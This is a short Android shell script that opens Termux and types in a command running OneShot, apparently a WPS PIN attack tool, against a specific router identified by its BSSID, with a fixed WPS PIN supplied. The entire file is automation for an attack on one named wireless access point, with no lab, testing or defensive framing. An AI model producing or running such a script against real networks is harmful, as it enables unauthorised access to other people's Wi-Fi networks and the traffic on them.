# !/bin/bash
am start -n com.termux/com.termux.app.TermuxActivity
sleep 1
input text "sudo python3 OneShot/oneshot.py -i wlan0 --iface-down  -b CC:2D:21:AE:59:A1 -p 11664284"
input keyevent 66